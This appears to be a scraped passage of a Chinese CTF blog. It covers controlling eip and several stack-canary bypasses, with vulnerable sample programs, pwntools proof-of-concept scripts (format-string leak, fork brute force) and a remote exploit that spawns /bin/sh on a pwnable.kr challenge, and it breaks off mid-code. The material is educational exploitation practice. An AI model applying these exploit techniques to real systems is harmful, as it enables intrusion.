-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>最近做了一些pwnable上的题，得到了一些微小的结论，特意与大家分享一下。</p>
-<h3 id="1、控制eip能够做什么"><a href="#1、控制eip能够做什么" class="headerlink" title="1、控制eip能够做什么"></a>1、控制eip能够做什么</h3><p>一般而言，作为pwn手小白，最希望的就是控制eip了，而控制eip究竟能做什么呢？</p>
-<p>控制eip，相当于就控制了程序的执行流程，从而获得了程序的最高权限，甚至能够绕过操作系统上的安全限制，直接获取用户shell或进行破坏性操作。</p>
-<p>而如果我们能够控制ctf题目中的eip，我们会进行怎样的操作呢?</p>
-<ul>
-<li>如果程序有shell地址，直接跳转至shell地址处，获得shell</li>
-<li>如果程序没有shell，我们能够构造rop链，一步步地更改寄存器、填充栈中值。最后也是获取shell</li>
-<li>如果程序NX保护没开，就可以直接跳转至栈中进行shellcode执行</li>
-<li>如果某个具有可执行地址段被写入了shellcode，我们也可以跳转至此获取shell</li>
-</ul>
-<h3 id="2、如何控制eip"><a href="#2、如何控制eip" class="headerlink" title="2、如何控制eip"></a>2、如何控制eip</h3><h4 id="2-1-通过修改返回地址控制eip"><a href="#2-1-通过修改返回地址控制eip" class="headerlink" title="2.1 通过修改返回地址控制eip"></a>2.1 通过修改返回地址控制eip</h4><p>一般通过栈溢出的方式、堆溢出造成的任意地址写功能、程序自身逻辑造成的任意地址写等错误来修改返回地址</p>
-<p>retn指令本来就是pop eip，如果能够在函数返回之前，将ret_addr替换为你想其执行的地址，就能够控制eip</p>
-<p>​                0xffffffe4|       ebp      |</p>
-<p>​                0xffffffe8|   ret_addr  |</p>
-<h4 id="2-2-通过栈迁移的方式控制eip"><a href="#2-2-通过栈迁移的方式控制eip" class="headerlink" title="2.2 通过栈迁移的方式控制eip"></a>2.2 通过栈迁移的方式控制eip</h4><p>所谓栈迁移，就是由于程序中有ebp，进而可以在程序返回后进入上一个栈帧中。</p>
-<p>如果我们能够控制ebp中的值（也即控制[\$ebp]），那么在栈帧迁移的时候（也就是在leave  ret指令执行的时候），我们就控制了[[\$ebp]+0x4]的值，而这个值实际上是上一个栈帧的返回地址。然后上一个栈帧在返回的时候，就控制了eip</p>
-<p>​                0xfffffee4 |     0xffffffe4   |</p>
-<p>​                0xfffffee8 |     ret_addr    |              此栈帧</p>
-<p>​                            ……</p>
-<p>​                0xffffffe0  |                        |            上一个栈帧</p>
-<p>​                0xffffffe4  |       ebp          |            上一个栈帧的起始地址</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/25/tools/工具大全/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Introspelliam">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/me.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Introspelliam">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/09/25/tools/工具大全/" itemprop="url">工具大全</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-25T11:43:30+08:00">
-                2017-09-25
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/tool/" itemprop="url" rel="index">
-                    <span itemprop="name">tool</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h4 id="shellcode脚本网站"><a href="#shellcode脚本网站" class="headerlink" title="shellcode脚本网站"></a>shellcode脚本网站</h4><p>​    <a href="http://shell-storm.org/shellcode/" target="_blank" rel="external">http://shell-storm.org/shellcode/</a></p>
-<h4 id="ARM学习网站"><a href="#ARM学习网站" class="headerlink" title="ARM学习网站"></a>ARM学习网站</h4><p>​    <a href="http://www.davespace.co.uk/arm/introduction-to-arm/" target="_blank" rel="external">http://www.davespace.co.uk/arm/introduction-to-arm/</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/23/pwn/论canary的几种玩法/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Introspelliam">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/me.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Introspelliam">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/09/23/pwn/论canary的几种玩法/" itemprop="url">论canary的几种玩法</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-23T21:58:51+08:00">
-                2017-09-23
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn/" itemprop="url" rel="index">
-                    <span itemprop="name">pwn</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>此文摘抄于veritas501的博文</p>
-<p><a href="http://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/" target="_blank" rel="external">http://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/</a></p>
-<p>里面讨论了我所知的几种关于canary的玩法，我目前不知道的就等我以后什么时候知道了再补充吧。</p>
-<hr>
-<h2 id="1-先说说canary"><a href="#1-先说说canary" class="headerlink" title="1. 先说说canary"></a>1. 先说说canary</h2><p>canary直译就是金丝雀，为什么是叫金丝雀？</p>
-<p>17世纪，英国矿井工人发现，金丝雀对瓦斯这种气体十分敏感。空气中哪怕有极其微量的瓦斯，金丝雀也会停止歌唱；而当瓦斯含量超过一定限度时，虽然鲁钝的人类毫无察觉，金丝雀却早已毒发身亡。当时在采矿设备相对简陋的条件下，工人们每次下井都会带上一只金丝雀作为“瓦斯检测指标”，以便在危险状况下紧急撤离。</p>
-<p>而程序里的canary就是来检测栈溢出的。</p>
-<p>检测的机制是这样的：</p>
-<p>1.程序从一个神奇的地方取出一个4（eax）或8（rax）节的值，在32位程序上，你可能会看到：</p>
-<p><img src="/images/2017-09-23/canary_1122569b3258873874d61fd5bfc62fba.png" alt="img"></p>
-<p><img src="/images/2017-09-23/canary_32.png" alt=""></p>
-<p>在64位上，你可能会看到：</p>
-<p><img src="/images/2017-09-23/canary_1d676e1ed18ade8675f112f61e39ab74.png" alt="img"></p>
-<p>总之，这个值你不能实现得到或预测，放到站上以后，eax中的副本也会被清空（xor eax,eax）</p>
-<p>2.程序正常的走完了流程，到函数执行完的时候，程序会再次从那个神奇的地方把canary的值取出来，和之前放在栈上的canary进行比较，如果因为栈溢出什么的原因覆盖到了canary而导致canary发生了变化则直接终止程序。</p>
-<p><img src="/images/2017-09-23/canary_1acfdb1810a2876c78383f4a3a66a515.png" alt="img"></p>
-<p><img src="/images/2017-09-23/canary_b151b13af2155fff6a842855cbbd4d07.png" alt="img"></p>
-<p>在栈中大致是这样一个画风：</p>
-<p><img src="/images/2017-09-23/canary_0037817e6e24d51983d3575e02fc398d.png" alt="img"></p>
-<hr>
-<h2 id="2-绕过canary-格式化字符串"><a href="#2-绕过canary-格式化字符串" class="headerlink" title="2. 绕过canary - 格式化字符串"></a>2. 绕过canary - 格式化字符串</h2><p>格式化字符串能够实现任意地址读写，具体的实现可以参考我blog中关于格式化字符串的总结，格式化字符串的细节不是本文讨论的重点。</p>
-<p>大体思路就是通过格式化字符串读取canary的值，然后在栈溢出的padding块把canary所在位置的值用正确的canary替换，从而绕过canary的检测。</p>
-<p>示例程序：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">/**</div><div class="line">* compile cmd: gcc source.c -m32 -o bin</div><div class="line">**/</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"></div><div class="line">void getflag(void) &#123;</div><div class="line">    char flag[100];</div><div class="line">    FILE *fp = fopen(&quot;./flag&quot;, &quot;r&quot;);</div><div class="line">    if (fp == NULL) &#123;</div><div class="line">        puts(&quot;get flag error&quot;);</div><div class="line">    &#125;</div><div class="line">    fgets(flag, 100, fp);</div><div class="line">    puts(flag);</div><div class="line">&#125;</div><div class="line">void init() &#123;</div><div class="line">    setbuf(stdin, NULL);</div><div class="line">    setbuf(stdout, NULL);</div><div class="line">    setbuf(stderr, NULL);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void fun(void) &#123;</div><div class="line">	char buffer[100];</div><div class="line">	read(STDIN_FILENO, buffer, 120);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(void) &#123;</div><div class="line">	char buffer[6];</div><div class="line">	init();</div><div class="line">	scanf(&quot;%6s&quot;,buffer);</div><div class="line">	printf(buffer);</div><div class="line">	fun();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>在第一次scanf的时候输入“%7$x”打印出canary，在fun中利用栈溢出控制eip跳转到getflag。</p>
-<p>poc:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">context.log_level = &apos;debug&apos;</div><div class="line"></div><div class="line">cn = process(&apos;./bin&apos;)</div><div class="line"></div><div class="line">cn.sendline(&apos;%7$x&apos;)</div><div class="line">canary = int(cn.recv(),16)</div><div class="line">print hex(canary)</div><div class="line"></div><div class="line">cn.send(&apos;a&apos;*100 + p32(canary) + &apos;a&apos;*12 + p32(0x0804863d))</div><div class="line"></div><div class="line">flag = cn.recv()</div><div class="line"></div><div class="line">log.success(&apos;flag is:&apos; + flag)</div></pre></td></tr></table></figure>
-<hr>
-<h2 id="3-绕过canary-针对调用方式一致"><a href="#3-绕过canary-针对调用方式一致" class="headerlink" title="3. 绕过canary - 针对调用方式一致"></a>3. 绕过canary - 针对调用方式一致</h2><p>linux下的canary有个明显的特性：<font color="#f00">那就是每个使用了canary的函数，其canary的值是完全一样的</font>。其实原理很简单，从上面给出的x86和x64的两种canary生成图示可以看出，linux的canary总是和large gs:14h或者fs:28h有关。这也就意味着，只要这个值不变，那么canary的值也不会变。显然，程序运行之后，这个地址的值不会发生改变。</p>
-<p>那么，这也产生了一种攻击方法，<font color="#f00">通过存在漏洞的函数之外的函数，间接打印或者求出canary，那么这个canary可以运用到任意函数中（包括漏洞函数）。</font></p>
-<p>漏洞利用样例就是pwnbale.kr中的md5 calculator那道题</p>
-<p>题目描述：</p>
-<blockquote>
-<p>We made a simple MD5 calculator as a network service.<br>Find a bug and exploit it to get a shell.</p>
-<p>Download : <a href="http://pwnable.kr/bin/hash" target="_blank" rel="external">http://pwnable.kr/bin/hash</a><br>hint : this service shares the same machine with pwnable.kr web service</p>
-<p>Running at : nc pwnable.kr 9002</p>
-</blockquote>
-<p><a href="http://www.jianshu.com/u/97cac88b9b6e" target="_blank" rel="external">sph7</a> 已经将这个问题完美解决，这里基本上摘抄于其原文</p>
-<p>ida打开文件，发现关键函数是process_hash，代码如下</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">process_hash</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> v0; <span class="comment">// ST14_4@3</span></div><div class="line">  <span class="keyword">void</span> *ptr; <span class="comment">// ST18_4@3</span></div><div class="line">  <span class="keyword">char</span> v3; <span class="comment">// [sp+1Ch] [bp-20Ch]@1</span></div><div class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+21Ch] [bp-Ch]@1</span></div><div class="line"></div><div class="line">  v4 = *MK_FP(__GS__, <span class="number">20</span>);</div><div class="line">  <span class="built_in">memset</span>(&amp;v3, <span class="number">0</span>, <span class="number">0x200</span>u);</div><div class="line">  <span class="keyword">while</span> ( getchar() != <span class="number">10</span> );</div><div class="line">  <span class="built_in">memset</span>(g_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(g_buf));</div><div class="line">  fgets(g_buf, <span class="number">1024</span>, <span class="built_in">stdin</span>);</div><div class="line">  <span class="built_in">memset</span>(&amp;v3, <span class="number">0</span>, <span class="number">0x200</span>u);</div><div class="line">  v0 = Base64Decode(g_buf, &amp;v3);</div><div class="line">  ptr = (<span class="keyword">void</span> *)calc_md5(&amp;v3, v0);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"MD5(data) : %s\n"</span>, ptr);</div><div class="line">  <span class="built_in">free</span>(ptr);</div><div class="line">  <span class="keyword">return</span> *MK_FP(__GS__, <span class="number">20</span>) ^ v4;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>这里的问题在与给g_buf分配了1024bytes的空间，但是只给u分配了512bytes的空间，而1024字节的base64解码之后的长度为768，所以这里有一个栈溢出。但是代码中有栈cookie，所以光靠这里是不能利用的。</p>
-<p>继续看代码，发现另一个函数</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">my_hash</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@4</span></div><div class="line">  <span class="keyword">int</span> v1; <span class="comment">// edx@4</span></div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [sp+0h] [bp-38h]@1</span></div><div class="line">  <span class="keyword">char</span> v3[<span class="number">32</span>]; <span class="comment">// [sp+Ch] [bp-2Ch]@2</span></div><div class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+2Ch] [bp-Ch]@1</span></div><div class="line"></div><div class="line">  v4 = *MK_FP(__GS__, <span class="number">20</span>);</div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</div><div class="line">    *(_DWORD *)&amp;v3[<span class="number">4</span> * i] = rand();</div><div class="line">  result = *(_DWORD *)&amp;v3[<span class="number">16</span>]</div><div class="line">         - *(_DWORD *)&amp;v3[<span class="number">24</span>]</div><div class="line">         + *(_DWORD *)&amp;v3[<span class="number">28</span>]</div><div class="line">         + v4</div><div class="line">         + *(_DWORD *)&amp;v3[<span class="number">8</span>]</div><div class="line">         - *(_DWORD *)&amp;v3[<span class="number">12</span>]</div><div class="line">         + *(_DWORD *)&amp;v3[<span class="number">4</span>]</div><div class="line">         + *(_DWORD *)&amp;v3[<span class="number">20</span>];</div><div class="line">  v1 = *MK_FP(__GS__, <span class="number">20</span>) ^ v4;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>在这个函数中，栈cookie被用来生成了一个hash值，而这个hash值会在交互中给出，结合题目中提到的提示，bin服务和pwnable.kr运行在同一台机器上，也就是说时间相同，这样就可以反算出栈cookie，从而get shell了。</p>
-<p>大概思路清晰之后，开始完成exp，首先是用c算出栈cookie</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> m = atoi(argv[<span class="number">2</span>]);</div><div class="line">    <span class="keyword">int</span> rands[<span class="number">8</span>];</div><div class="line">    srand(atoi(argv[<span class="number">1</span>]));</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; i++) rands[i] = rand();</div><div class="line">    m -= (rands[<span class="number">1</span>] + rands[<span class="number">2</span>] - rands[<span class="number">3</span>] + rands[<span class="number">4</span>] + rands[<span class="number">5</span>] - rands[<span class="number">6</span>] + rands[<span class="number">7</span>]);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%x\n"</span>, m);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>完成cookie的计算，分析到这里就可以写exp了，主要思路是溢出掉v3，用验证码和时间计算出栈cookie，最后调用system(&quot;/bin/sh&quot;)</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">p = remote(<span class="string">"pwnable.kr"</span>, <span class="number">9002</span>)</div><div class="line">t = int(time.time())</div><div class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"captcha"</span>)</div><div class="line">captcha = p.recvline()</div><div class="line">captchapos = captcha.find(<span class="string">' : '</span>)+len(<span class="string">' : '</span>)</div><div class="line">captcha = captcha[captchapos:].strip()</div><div class="line">p.sendline(captcha)</div><div class="line"><span class="keyword">print</span> p.recvline()</div><div class="line"><span class="keyword">print</span> p.recvline()</div><div class="line">cmd = <span class="string">"./hash %s %s"</span> % (t, captcha)</div><div class="line">cookie = <span class="string">"0x"</span> + os.popen(cmd).read().strip()</div><div class="line"></div><div class="line">payload = <span class="string">'A'</span> * <span class="number">512</span> <span class="comment"># 512 byte v3</span></div><div class="line">payload += p32(int(cookie, <span class="number">16</span>))</div><div class="line">payload += <span class="string">'A'</span> * <span class="number">12</span></div><div class="line">payload += p32(<span class="number">0x08049187</span>)  <span class="comment"># system</span></div><div class="line">payload += p32(<span class="number">0x0804B0E0</span> + <span class="number">537</span>*<span class="number">4</span>/<span class="number">3</span>)  <span class="comment"># .bss =&gt; address of /bin/sh</span></div><div class="line">payload = b64e(payload)</div><div class="line">payload += <span class="string">"/bin/sh\0"</span></div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
-<hr>
-<h2 id="4-绕过canary-针对fork的进程"><a href="#4-绕过canary-针对fork的进程" class="headerlink" title="4. 绕过canary - 针对fork的进程"></a>4. 绕过canary - 针对fork的进程</h2><p>对fork而言，作用相当于自我复制，每一次复制出来的程序，内存布局都是一样的，当然canary值也一样。那我们就可以逐位爆破，如果程序GG了就说明这一位不对，如果程序正常就可以接着跑下一位，直到跑出正确的canary。</p>
-<p>另外有一点就是canary的最低位是0x00，这么做为了防止canary的值泄漏。比如在canary上面是一个字符串，正常来说字符串后面有0截断，如果我们恶意写满字符串空间，而程序后面又把字符串打印出来了，那个由于没有0截断canary的值也被顺带打印出来了。设计canary的人正是考虑到了这一点，就让canary的最低位恒为零，这样就不存在上面截不截断的问题了。</p>
-<p>示例程序：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line">/**</div><div class="line">* compile cmd: gcc source.c -m32 -o bin</div><div class="line">**/</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;sys/wait.h&gt;</div><div class="line"></div><div class="line">void getflag(void) &#123;</div><div class="line">    char flag[100];</div><div class="line">    FILE *fp = fopen(&quot;./flag&quot;, &quot;r&quot;);</div><div class="line">    if (fp == NULL) &#123;</div><div class="line">        puts(&quot;get flag error&quot;);</div><div class="line">		exit(0);</div><div class="line">    &#125;   </div><div class="line">    fgets(flag, 100, fp);</div><div class="line">    puts(flag);</div><div class="line">&#125;</div><div class="line">void init() &#123;</div><div class="line">    setbuf(stdin, NULL);</div><div class="line">    setbuf(stdout, NULL);</div><div class="line">    setbuf(stderr, NULL);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void fun(void) &#123;</div><div class="line">    char buffer[100];</div><div class="line">    read(STDIN_FILENO, buffer, 120);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(void) &#123;</div><div class="line">    init();</div><div class="line">	pid_t pid;</div><div class="line">	while(1) &#123;</div><div class="line">		pid = fork();</div><div class="line">		if(pid &lt; 0) &#123;</div><div class="line">			puts(&quot;fork error&quot;);</div><div class="line">			exit(0);</div><div class="line">		&#125;</div><div class="line">		else if(pid == 0) &#123;</div><div class="line">			puts(&quot;welcome&quot;);</div><div class="line">			fun();</div><div class="line">			puts(&quot;recv sucess&quot;);</div><div class="line">		&#125;</div><div class="line">		else &#123;</div><div class="line">			wait(0);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>poc脚本：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">context.log_level = &apos;debug&apos;</div><div class="line"></div><div class="line">cn = process(&apos;./bin&apos;)</div><div class="line"></div><div class="line">cn.recvuntil(&apos;welcome\n&apos;)</div><div class="line">canary = &apos;\x00&apos;</div><div class="line">for j in range(3):</div><div class="line">    for i in range(0x100):</div><div class="line">        cn.send(&apos;a&apos;*100 + canary + chr(i))</div><div class="line">        a = cn.recvuntil(&apos;welcome\n&apos;)</div><div class="line">        if &apos;recv&apos; in a:</div><div class="line">            canary += chr(i)</div><div class="line">            break</div><div class="line"></div><div class="line">cn.sendline(&apos;a&apos;*100 + canary + &apos;a&apos;*12 + p32(0x0804864d))</div><div class="line"></div><div class="line">flag = cn.recv()</div><div class="line">cn.close()</div><div class="line">log.success(&apos;flag is:&apos; + flag)</div></pre></td></tr></table></figure>
-<hr>
-<h2 id="5-故意触发canary-ssp-leak"><a href="#5-故意触发canary-ssp-leak" class="headerlink" title="5. 故意触发canary - ssp leak"></a>5. 故意触发canary - ssp leak</h2><p>这题可以参考jarvis oj中 smashes一题的解题方法中的前一半。</p>
-<p>这里我偷个懒，直接把之前写的wp扔过来了，反正原理都在题里了。</p>
-<p>题目描述：</p>
-<blockquote>
-<p>Smashes, try your best to smash!!!</p>
-<p>nc pwn.jarvisoj.com 9877</p>
-<p><a href="https://dn.jarvisoj.com/challengefiles/smashes.44838f6edd4408a53feb2e2bbfe5b229" target="_blank" rel="external">smashes.44838f6edd4408a53feb2e2bbfe5b229</a></p>
-</blockquote>
-<p>首先查看保护</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ checksec pwn_smashes </div><div class="line">[*] &apos;/home/veritas/pwn/jarvisoj/smashes/pwn_smashes&apos;</div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    No RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE (0x400000)</div><div class="line">    FORTIFY:  Enabled</div></pre></td></tr></table></figure>
-<p>有canary，有nx</p>
-<p>ida找到关键函数：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">__int64 func_1()</div><div class="line">&#123;</div><div class="line">  __int64 v0; // rax@1</div><div class="line">  __int64 v1; // rbx@2</div><div class="line">  int v2; // eax@3</div><div class="line">  __int64 buffer; // [sp+0h] [bp-128h]@1</div><div class="line">  __int64 canary; // [sp+108h] [bp-20h]@1</div><div class="line"></div><div class="line">  canary = *MK_FP(__FS__, 40LL);</div><div class="line">  __printf_chk(1LL, 